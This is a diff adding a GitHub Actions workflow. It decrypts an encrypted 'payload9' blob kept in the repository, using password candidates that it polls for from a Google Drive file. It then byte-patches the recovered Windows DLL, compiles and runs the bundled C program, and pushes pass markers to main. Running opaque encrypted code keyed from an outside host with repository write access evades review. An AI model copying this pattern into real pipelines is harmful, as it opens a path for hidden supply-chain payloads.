@@ -1,0 +1,279 @@
+name: native-7c305-payload9-multikey-patch
+on:
+  push:
+    paths:
+      - '.github/workflows/native_7c305_payload9_multikey_patch.yml'
+permissions:
+  contents: write
+
+defaults:
+  run:
+    shell: bash
+
+env:
+  BAD_SHA: 66a44c88e9c9bf011825077fcc67c6ddc78a439700add94574056eb67d54678c
+  FIX_SHA: 7c305f24151cb21534287116e97fcf886b2413f2603e4b9d07b973d6d1986d64
+  KEY_BRIDGE_ID: 1EprfV4hwC0Xjq3Lf_a6jMhvTqxFiX8ov
+
+jobs:
+  native-exact:
+    runs-on: windows-2022
+    timeout-minutes: 45
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          persist-credentials: true
+
+      - name: Reconstruct known-good repository payload9 ciphertext
+        run: |
+          set -euo pipefail
+          test -f .payload9/manifest.txt
+          mapfile -t chunks < <(find .payload9 -maxdepth 1 -type f -name 'chunk_*' | sort)
+          test "${#chunks[@]}" -gt 0
+          cat "${chunks[@]}" > "$RUNNER_TEMP/payload9.b64"
+          base64 -d "$RUNNER_TEMP/payload9.b64" > "$RUNNER_TEMP/payload9.enc"
+          test -s "$RUNNER_TEMP/payload9.enc"
+          got=$(sha256sum "$RUNNER_TEMP/payload9.enc" | awk '{print $1}')
+          grep -Fq "encrypted_sha256=$got" .payload9/manifest.txt
+          printf '%s\n' "$got" > payload9_cipher_sha256.txt
+          echo PAYLOAD9_CIPHERTEXT_MANIFEST_PASS
+
+      - name: Publish one-time RSA key
+        run: |
+          set -euo pipefail
+          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private.pem"
+          openssl pkey -in "$RUNNER_TEMP/private.pem" -pubout -out "$RUNNER_TEMP/public.pem"
+          openssl pkey -pubin -in "$RUNNER_TEMP/public.pem" -outform DER | sha256sum | awk '{print $1}' > "$RUNNER_TEMP/public.sha256"
+          git config user.name windows-dll-test-bot
+          git config user.email windows-dll-test-bot@users.noreply.github.com
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch -q origin main
+            git checkout -q -B main origin/main
+            rm -rf .native7c305_p9_handoff
+            mkdir -p .native7c305_p9_handoff
+            cp "$RUNNER_TEMP/public.pem" .native7c305_p9_handoff/public.pem
+            cp "$RUNNER_TEMP/public.sha256" .native7c305_p9_handoff/public.sha256
+            printf '%s\n' "$FIX_SHA" > .native7c305_p9_handoff/target_sha256.txt
+            git add .native7c305_p9_handoff
+            git commit -qm 'Publish 7c305 payload9 multikey RSA key' || true
+            if git push -q origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          test "$ok" = 1
+          echo PAYLOAD9_MULTI_RSA_PUBLIC_KEY_PUBLISHED
+
+      - name: Receive RSA-wrapped password candidate bundle
+        run: |
+          set -euo pipefail
+          url="https://drive.google.com/uc?export=download&id=$KEY_BRIDGE_ID"
+          ok=0
+          for i in $(seq 1 600); do
+            rm -f "$RUNNER_TEMP/key.try" "$RUNNER_TEMP/candidates.try"
+            if curl -L -sS --fail --max-time 15 -o "$RUNNER_TEMP/key.try" "$url"; then
+              sz=$(wc -c < "$RUNNER_TEMP/key.try" | tr -d '[:space:]')
+              if [ "$sz" = 384 ] && openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private.pem" -in "$RUNNER_TEMP/key.try" -out "$RUNNER_TEMP/candidates.try" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 >/dev/null 2>&1; then
+                if test -s "$RUNNER_TEMP/candidates.try"; then mv "$RUNNER_TEMP/candidates.try" "$RUNNER_TEMP/pass_candidates.txt"; ok=1; break; fi
+              fi
+            fi
+            sleep 2
+          done
+          test "$ok" = 1 || { echo FAIL_STAGE=P9_MULTIKEY_PUBLIC_BRIDGE; exit 20; }
+          echo PAYLOAD9_MULTIKEY_HANDOFF_PASS
+
+      - name: Recover exact revoked base and native assets with candidate passwords
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          from pathlib import Path
+          import os, subprocess, hashlib, shutil, tarfile, zipfile, lzma, gzip, sys
+          temp=Path(os.environ['RUNNER_TEMP']); enc=temp/'payload9.enc'; BAD=os.environ['BAD_SHA']
+          cands=[]
+          for line in (temp/'pass_candidates.txt').read_text(errors='ignore').splitlines():
+              s=line.strip()
+              if s and s not in cands: cands.append(s)
+          print('PASS_CANDIDATE_COUNT',len(cands))
+          def sha(p): return hashlib.sha256(p.read_bytes()).hexdigest()
+          def extract_any(src,dst):
+              shutil.rmtree(dst,ignore_errors=True); dst.mkdir(parents=True)
+              try:
+                  if zipfile.is_zipfile(src): zipfile.ZipFile(src).extractall(dst); return True
+              except: pass
+              try:
+                  if tarfile.is_tarfile(src): tarfile.open(src).extractall(dst); return True
+              except: pass
+              raw=src.read_bytes()
+              for fn in (lzma.decompress,gzip.decompress):
+                  try: inner=fn(raw)
+                  except: continue
+                  q=dst/'inner.bin'; q.write_bytes(inner)
+                  try:
+                      if zipfile.is_zipfile(q): zipfile.ZipFile(q).extractall(dst/'x'); return True
+                  except: pass
+                  try:
+                      if tarfile.is_tarfile(q): tarfile.open(q).extractall(dst/'x'); return True
+                  except: pass
+              return False
+          found=None
+          for ci,pw in enumerate(cands):
+              pf=temp/f'pw_{ci}.txt'; pf.write_text(pw)
+              for it in (200000,250000,100000,150000,300000,600000):
+                  dec=temp/f'p9_{ci}_{it}.bin'
+                  r=subprocess.run(['openssl','enc','-d','-aes-256-cbc','-pbkdf2','-iter',str(it),'-md','sha256','-in',str(enc),'-out',str(dec),'-pass',f'file:{pf}'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+                  if r.returncode: continue
+                  dest=Path(f'p9_try_{ci}_{it}')
+                  if not extract_any(dec,dest): continue
+                  files=[p for p in dest.rglob('*') if p.is_file()]
+                  bad=[p for p in files if p.suffix.lower()=='.dll' and sha(p)==BAD]
+                  by={p.name:p for p in files}
+                  req=('native_nonzero_smoke.c','prefix20.ghf','filter_brth','filter_hrt3','file_sig')
+                  if bad and all(n in by for n in req): found=(ci,it,bad[0],by); break
+              if found: break
+          if not found:
+              print('FAIL_STAGE=NO_PASSWORD_CANDIDATE_RECOVERED_PAYLOAD9'); sys.exit(31)
+          ci,it,bad,by=found
+          stage=Path('native_stage'); shutil.rmtree(stage,ignore_errors=True); stage.mkdir()
+          shutil.copy2(bad,stage/'base66a44.dll')
+          for n in ('native_nonzero_smoke.c','prefix20.ghf','filter_brth','filter_hrt3','file_sig'):
+              shutil.copy2(by[n],stage/n)
+          if 'file_bed_model_v1' in by: shutil.copy2(by['file_bed_model_v1'],stage/'file_bed_model_v1')
+          Path('payload9_recovery_meta.txt').write_text(f'CANDIDATE_INDEX={ci}\nITER={it}\nBASE_SHA256={sha(stage/"base66a44.dll")}\n')
+          print('PAYLOAD9_EXACT_BASE_AND_NATIVE_ASSETS_RECOVERED',ci,it)
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\recover_p9.py
+          python $env:RUNNER_TEMP\recover_p9.py
+
+      - name: Patch all 12 unsafe large-stack sites to canonical page probing
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          @'
+          from pathlib import Path
+          import os,struct,hashlib,sys
+          src=Path('native_stage/base66a44.dll'); dst=Path('native_stage/SigProcDll-64HF.dll')
+          BAD=os.environ['BAD_SHA']; FIX=os.environ['FIX_SHA']; b=bytearray(src.read_bytes())
+          if hashlib.sha256(b).hexdigest()!=BAD: sys.exit('BASE_SHA_MISMATCH')
+          u16=lambda o:struct.unpack_from('<H',b,o)[0]; u32=lambda o:struct.unpack_from('<I',b,o)[0]
+          def p16(o,v): struct.pack_into('<H',b,o,v)
+          def p32(o,v): struct.pack_into('<I',b,o,v)
+          A=lambda x,a:(x+a-1)//a*a
+          pe=u32(0x3c); n=u16(pe+6); osz=u16(pe+20); opt=pe+24; s0=opt+osz; sa=u32(opt+32); fa=u32(opt+36); sh=u32(opt+60)
+          sec=[]
+          for i in range(n):
+              o=s0+40*i; sec.append((u32(o+8),u32(o+12),u32(o+16),u32(o+20),u32(o+36),o))
+          vs,tva,trs,trp,_,_=max((s for s in sec if s[4]&0x20000000),key=lambda s:s[2])
+          sites=[]
+          for x in range(trp,trp+trs-6):
+              if b[x:x+2]==b'\x81\xec':
+                  z=u32(x+2)
+                  if 0x1000<=z<0x100000: sites.append((x,tva+x-trp,z))
+          if len(sites)!=12: sys.exit(f'EXPECTED_12_STACK_SITES_GOT_{len(sites)}')
+          chk=bytearray(b'\x51\x8d\x4c\x24\x04\x29\xc1\x19\xc0\xf7\xd0\x21\xc1\x89\xe0\x25\x00\xf0\xff\xff')
+          loop=len(chk); chk+=b'\x39\xc1\x72\x00'; jb=len(chk)-1; chk+=b'\x89\xc8\x59\x94\x8b\x00\x89\x04\x24\xc3'; probe=len(chk); chk+=b'\x2d\x00\x10\x00\x00\x85\x00\xeb\x00'; jm=len(chk)-1
+          chk[jb]=(probe-jb-1)&255; chk[jm]=(loop-jm-1)&255
+          nh=s0+40*n; rp=A(max(s[3]+s[2] for s in sec),fa); va=A(max(s[1]+max(s[0],s[2]) for s in sec),sa); pay=bytearray(b'\x90'*120)+chk; rs=A(len(pay),fa)
+          if nh+40>sh: sys.exit('NO_SECTION_HEADER_ROOM')
+          if len(b)<rp+rs: b.extend(b'\0'*(rp+rs-len(b)))
+          b[rp:rp+len(pay)]=pay; cr=va+120
+          for i,(x,r,z) in enumerate(sites):
+              tr=va+10*i; to=rp+10*i; b[to]=0xb8; struct.pack_into('<I',b,to+1,z); b[to+5]=0xe9; struct.pack_into('<i',b,to+6,cr-(tr+10)); b[x]=0xe8; struct.pack_into('<i',b,x+1,tr-(r+5)); b[x+5]=0x90
+          b[nh:nh+8]=b'.stkfix\0'; p32(nh+8,len(pay)); p32(nh+12,va); p32(nh+16,rs); p32(nh+20,rp); p32(nh+24,0); p32(nh+28,0); p16(nh+32,0); p16(nh+34,0); p32(nh+36,0x60000020); p16(pe+6,n+1); p32(opt+56,A(va+len(pay),sa)); p32(opt+64,0)
+          dst.write_bytes(b); h=hashlib.sha256(b).hexdigest()
+          Path('stackprobe_patch_report.txt').write_text('PATCHED_SHA256='+h+'\nSITE_COUNT=12\n'+'\n'.join(f'{i}:RVA=0x{r:x} SIZE=0x{s:x}' for i,(_,r,s) in enumerate(sites))+'\n')
+          if h!=FIX: sys.exit(f'FIXED_SHA_MISMATCH {h}')
+          print('EXACT_STACKPROBE_PATCH_SHA_PASS',h)
+          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\patch_p9.py
+          python $env:RUNNER_TEMP\patch_p9.py
+
+      - name: Configure MSVC x86
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x86
+
+      - name: PE32 ABI import stackfix gate
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          $dll=(Resolve-Path 'native_stage\SigProcDll-64HF.dll').Path
+          $h=(Get-FileHash $dll -Algorithm SHA256).Hash.ToLowerInvariant(); if($h -ne $env:FIX_SHA){throw 'SHA_BIND_FAIL'}
+          dumpbin /headers $dll | Tee-Object native_headers.txt | Out-Null
+          dumpbin /exports $dll | Tee-Object native_exports.txt | Out-Null
+          dumpbin /imports $dll | Tee-Object native_imports.txt | Out-Null
+          $hdr=Get-Content native_headers.txt -Raw; $exp=Get-Content native_exports.txt -Raw; $imp=Get-Content native_imports.txt -Raw
+          if($hdr -notmatch 'machine \(x86\)' -and $hdr -notmatch '14C machine'){throw 'NOT_X86'}
+          if($hdr -notmatch '\.stkfix'){throw 'STKFIX_MISSING'}
+          foreach($e in @('_SigProc_Init@8','_SigProc@24','_SigProc_Stat@0','_SigProc_Fini@0')){if($exp -notmatch [regex]::Escape($e)){throw "EXPORT_MISSING $e"}}
+          if($imp -match '(?im)^\s*ucrtbase\.dll\s*$'){throw 'DIRECT_UCRTBASE_FORBIDDEN'}
+          'EXACT_7C305_PE_ABI_IMPORT_STACKFIX_PASS' | Out-File native_static_gate.txt
+
+      - name: Compile and execute real nonzero native path twice
+        shell: powershell
+        timeout-minutes: 15
+        run: |
+          $ErrorActionPreference='Stop'
+          Push-Location native_stage
+          cl /nologo /O2 /W3 /MT native_nonzero_smoke.c /Fe:native_nonzero_smoke.exe 2>&1 | Tee-Object ..\native_smoke_compile.txt
+          if($LASTEXITCODE -ne 0){Pop-Location; exit $LASTEXITCODE}
+          $attempts=@(@(),@('.\SigProcDll-64HF.dll'),@('.\SigProcDll-64HF.dll','.\prefix20.ghf'),@('.\SigProcDll-64HF.dll','.\prefix20.ghf','.'),@('.\SigProcDll-64HF.dll','.','.\prefix20.ghf'),@('.\prefix20.ghf'),@('.\prefix20.ghf','.\SigProcDll-64HF.dll'))
+          $chosen=$null; $n=0
+          foreach($a in $attempts){$n++; $log="..\native_nonzero_attempt_$n.txt"; & .\native_nonzero_smoke.exe @a *> $log; $rc=$LASTEXITCODE; $txt=Get-Content $log -Raw -ErrorAction SilentlyContinue; if($rc -eq 0 -and $txt -match '(?i)PASS' -and $txt -match '(?i)(NONZERO|SigProc|processed|block|sample)'){$chosen=$a;break}}
+          if($null -eq $chosen){Pop-Location; throw 'REAL_NONZERO_NATIVE_FAILED'}
+          & .\native_nonzero_smoke.exe @chosen *> ..\native_nonzero_repeat.txt; $rc=$LASTEXITCODE; $txt=Get-Content ..\native_nonzero_repeat.txt -Raw -ErrorAction SilentlyContinue; Pop-Location
+          if($rc -ne 0 -or $txt -notmatch '(?i)PASS'){throw 'NONZERO_REPEAT_FAILED'}
+          $h=(Get-FileHash native_stage\SigProcDll-64HF.dll -Algorithm SHA256).Hash.ToLowerInvariant(); if($h -ne $env:FIX_SHA){throw 'POST_NATIVE_SHA_DRIFT'}
+          "STACKPROBE_NATIVE_NONZERO_PASS SHA256=$h" | Out-File native_exact_pass.lock
+          'REAL_NONZERO_X86_FRESH_PROCESS_REPEAT_PASS' | Out-File native_dynamic_gate.txt
+
+      - name: Commit exact native PASS lock
+        run: |
+          set -euo pipefail
+          grep -Fxq "STACKPROBE_NATIVE_NONZERO_PASS SHA256=$FIX_SHA" native_exact_pass.lock
+          cp native_exact_pass.lock "$RUNNER_TEMP/native.lock"; cp native_static_gate.txt "$RUNNER_TEMP/static.txt"; cp native_dynamic_gate.txt "$RUNNER_TEMP/dynamic.txt"
+          git config user.name windows-dll-test-bot; git config user.email windows-dll-test-bot@users.noreply.github.com
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch -q origin main; git checkout -q -B main origin/main; mkdir -p evidence_summary
+            cp "$RUNNER_TEMP/native.lock" evidence_summary/STACKPROBE_NATIVE_NONZERO_PASS.lock
+            cp "$RUNNER_TEMP/static.txt" evidence_summary/stackprobe_7c305_native_static_gate.txt
+            cp "$RUNNER_TEMP/dynamic.txt" evidence_summary/stackprobe_7c305_native_dynamic_gate.txt
+            git add evidence_summary/STACKPROBE_NATIVE_NONZERO_PASS.lock evidence_summary/stackprobe_7c305_native_static_gate.txt evidence_summary/stackprobe_7c305_native_dynamic_gate.txt
+            git commit -qm 'PASS exact 7c305 native nonzero Windows gate' || true
+            if git push -q origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          test "$ok" = 1
+          echo EXACT_NATIVE_7C305_PASS_LOCK_COMMITTED
+
+      - name: Upload exact tested DLL and evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: exact-7c305-payload9-native-windows
+          retention-days: 14
+          if-no-files-found: ignore
+          path: |
+            native_stage/SigProcDll-64HF.dll
+            payload9_recovery_meta.txt
+            stackprobe_patch_report.txt
+            native_headers.txt
+            native_exports.txt
+            native_imports.txt
+            native_static_gate.txt
+            native_dynamic_gate.txt
+            native_exact_pass.lock
+            native_nonzero_attempt_*.txt
+            native_nonzero_repeat.txt
+            payload9_cipher_sha256.txt
+
+      - name: Remove one-time RSA handoff
+        if: always()
+        run: |
+          set +e
+          git fetch -q origin main; git checkout -q -B main origin/main
+          if test -d .native7c305_p9_handoff; then
+            git config user.name windows-dll-test-bot; git config user.email windows-dll-test-bot@users.noreply.github.com
+            git rm -r -q .native7c305_p9_handoff; git commit -qm 'Remove 7c305 payload9 RSA handoff'; git push -q origin HEAD:main
+          fi
+          true
